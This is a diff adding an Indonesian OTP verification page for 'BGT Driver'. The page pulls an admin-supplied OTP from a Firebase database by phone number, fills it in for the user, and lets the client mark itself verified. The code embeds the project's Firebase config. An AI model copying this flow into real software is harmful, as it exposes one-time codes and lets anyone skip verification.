@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi OTP — BGT Driver</title>
+<script src="https://cdn.tailwindcss.com"></script>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+  <div class="bg-white shadow-xl rounded-xl p-6 w-full max-w-sm">
+    <h1 class="text-2xl font-bold text-center text-blue-600 mb-6">Verifikasi OTP</h1>
+
+    <p class="text-center text-gray-600 mb-4">Masukkan atau tunggu kode OTP dari admin:</p>
+
+    <div id="nomorTelepon" class="text-center font-semibold text-gray-700 mb-4"></div>
+
+    <!-- Input OTP -->
+    <div class="mb-4">
+      <input type="text" id="otpInput" maxlength="6" placeholder="Menunggu OTP..." disabled
+        class="w-full border border-gray-300 rounded-lg p-2 text-center text-gray-500 bg-gray-100 focus:outline-none">
+    </div>
+
+    <!-- Tombol -->
+    <div class="flex justify-center gap-2">
+      <button id="verifikasiBtn" class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2 rounded-lg font-semibold transition-all duration-200 hidden">
+        Lanjutkan
+      </button>
+    </div>
+
+    <p id="status" class="text-center text-sm text-gray-500 mt-4">Menunggu OTP dari admin...</p>
+  </div>
+
+<script>
+  // === Konfigurasi Firebase ===
+  const firebaseConfig = {
+    apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
+    authDomain: "kadek-ed34e.firebaseapp.com",
+    databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
+    projectId: "kadek-ed34e",
+    storageBucket: "kadek-ed34e.firebasestorage.app",
+    messagingSenderId: "65756136303",
+    appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  // === Ambil nomor telepon dari URL ===
+  const params = new URLSearchParams(window.location.search);
+  const telepon = params.get("telepon");
+  document.getElementById("nomorTelepon").innerText = telepon || "";
+
+  const otpInput = document.getElementById("otpInput");
+  const verifikasiBtn = document.getElementById("verifikasiBtn");
+  const statusText = document.getElementById("status");
+
+  // === Pantau OTP dari Admin secara realtime ===
+  if (telepon) {
+    const ref = db.ref("pendaftaran").orderByChild("telepon").equalTo(telepon);
+
+    ref.on("value", snapshot => {
+      if (snapshot.exists()) {
+        snapshot.forEach(child => {
+          const data = child.val();
+          if (data.otp && data.otp !== "-") {
+            otpInput.value = data.otp;
+            otpInput.disabled = false;
+            otpInput.classList.remove("text-gray-500", "bg-gray-100");
+            otpInput.classList.add("text-gray-800", "bg-white", "font-semibold");
+            statusText.innerText = "OTP telah diterima dari admin.";
+            statusText.classList.add("text-green-500");
+            verifikasiBtn.classList.remove("hidden");
+
+            // Tombol lanjutkan -> ubah status verifikasi & buka dashboard di tab baru
+            verifikasiBtn.onclick = () => {
+              db.ref("pendaftaran/" + child.key).update({ status: "verifikasi_selesai" });
+              statusText.innerText = "Verifikasi berhasil! Membuka halaman baru...";
+              setTimeout(() => {
+                window.open(`jancok2.html?telepon=${encodeURIComponent(telepon)}`, "_blank");
+              }, 1500);
+            };
+          } else {
+            statusText.innerText = "Menunggu OTP dari admin...";
+            verifikasiBtn.classList.add("hidden");
+          }
+        });
+      } else {
+        statusText.innerText = "Nomor tidak ditemukan di database.";
+      }
+    });
+  } else {
+    statusText.innerText = "Nomor telepon tidak valid.";
+  }
+</script>
+
+</body>
+</html>
